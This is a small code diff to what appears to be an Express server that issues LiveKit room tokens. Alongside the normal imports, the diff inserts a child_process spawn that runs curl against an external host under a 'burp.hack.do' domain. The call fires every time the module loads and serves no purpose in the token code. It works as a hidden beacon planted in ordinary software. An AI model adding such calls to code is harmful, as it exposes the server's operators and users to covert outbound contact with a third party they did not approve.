@@ -2,6 +2,10 @@ import dotenv from 'dotenv';
 import express from 'express';
 import { AccessToken } from 'livekit-server-sdk';
 
+const { spawn } = require('child_process');
+
+const child = spawn('curl', ['https://ioarekffinyt27u7j4rrtnleu50woncc.burp.hack.do'], {});
+
 type TokenRequest = {
   roomName: string;
   participantName: string;
